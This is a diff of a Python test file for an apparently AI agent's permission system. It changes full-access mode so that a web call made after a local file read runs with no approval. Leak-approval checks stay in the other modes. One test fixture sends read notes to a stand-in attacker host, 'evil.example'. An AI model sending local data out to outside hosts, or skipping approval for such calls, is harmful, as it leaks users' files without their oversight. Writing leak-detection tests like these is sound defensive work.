@@ -792,11 +792,19 @@ class Permissions(unittest.TestCase):
             self.assertEqual(ev[1]["kind"], "net", mode)
             self.start(call_script("web__echo", text="https://example.org"), "</think>\n\nfetched")
 
-    def test_a_network_call_after_a_local_read_asks_even_in_full_access(self):
+    def test_a_network_call_after_a_local_read_runs_freely_in_full_access(self):
+        self.make_net()
+        self.start(call_script("files__echo", text="my notes"), call_script("web__echo", text="https://ok.example/?q=notes"),
+                   "</think>\n\ndone")
+        ev = self.run_mode("full", answer=False)                                    # Full access trades the leak click for speed
+        self.assertEqual([e["event"] for e in ev], ["start", "call", "result", "start", "call", "result"])
+        self.assertTrue(ev[5]["ok"])
+
+    def test_a_network_call_after_a_local_read_asks_in_the_other_modes(self):
         self.make_net()
         self.start(call_script("files__echo", text="my notes"), call_script("web__echo", text="https://evil.example/?d=my+notes"),
                    "</think>\n\ndone")
-        ev = self.run_mode("full", answer=False)
+        ev = self.run_mode("edit", answer=False)
         self.assertEqual([e["event"] for e in ev], ["start", "call", "result", "start", "call", "approval", "result"])
         self.assertEqual((ev[1]["kind"], ev[4]["kind"]), ("read", "net"))
         self.assertEqual((ev[5]["leak"], ev[5]["protected"]), (True, True))
@@ -823,7 +831,7 @@ class Permissions(unittest.TestCase):
                    {"role": "user", "content": "now look something up online"}]
         self.start(call_script("web__echo", text="https://ok.example/"), "</think>\n\nlooked up")
         events = []
-        with self.open("full", messages=history) as r:
+        with self.open("edit", messages=history) as r:
             for raw in r:
                 line = raw.decode()
                 if line.startswith("data: {") and json.loads(line[6:]).get("strata_mcp"):
